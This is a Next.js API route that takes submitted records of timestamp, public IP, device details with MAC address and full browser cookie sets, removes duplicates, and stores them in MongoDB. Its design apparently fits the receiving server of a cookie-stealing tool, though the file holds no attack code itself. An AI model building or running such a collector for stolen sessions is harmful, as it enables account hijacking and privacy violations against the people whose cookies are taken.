import { NextRequest, NextResponse } from "next/server";
import dbConnect from "@/lib/mongodb";
import Submission from "@/models/Submission";

export async function POST(req: NextRequest) {
  try {
    const data = await req.json();

    const { timestamp, public_ip, device_info, cookies } = data;

    if (!timestamp || !public_ip || !device_info || !cookies) {
      return NextResponse.json(
        { error: "Missing required fields" },
        { status: 400 }
      );
    }

    await dbConnect();

    // Check for duplicates
    // Consider duplicate if:
    // 1. cookies object is exactly the same
    // 2. mac_address is the same
    // 3. timestamp is within 5 minutes

    const submittedTime = new Date(timestamp);
    const fiveMinutesAgo = new Date(submittedTime.getTime() - 5 * 60 * 1000);
    const fiveMinutesAfter = new Date(submittedTime.getTime() + 5 * 60 * 1000);

    const existingSubmission = await Submission.findOne({
      "device_info.mac_address": device_info.mac_address,
      timestamp: {
        $gte: fiveMinutesAgo.toISOString(),
        $lte: fiveMinutesAfter.toISOString(),
      },
    });

    if (existingSubmission) {
      // Check if cookies are exactly the same
      const existingCookiesStr = JSON.stringify(existingSubmission.cookies);
      const newCookiesStr = JSON.stringify(cookies);

      if (existingCookiesStr === newCookiesStr) {
        return NextResponse.json(
          {
            message: "Duplicate submission detected, skipping insert",
            isDuplicate: true,
          },
          { status: 200 }
        );
      }
    }

    // Insert new submission
    const submission = await Submission.create({
      timestamp,
      public_ip,
      device_info,
      cookies,
    });

    return NextResponse.json(
      {
        message: "Submission saved successfully",
        id: submission._id,
        isDuplicate: false,
      },
      { status: 201 }
    );
  } catch (error) {
    console.error("Submit cookies error:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
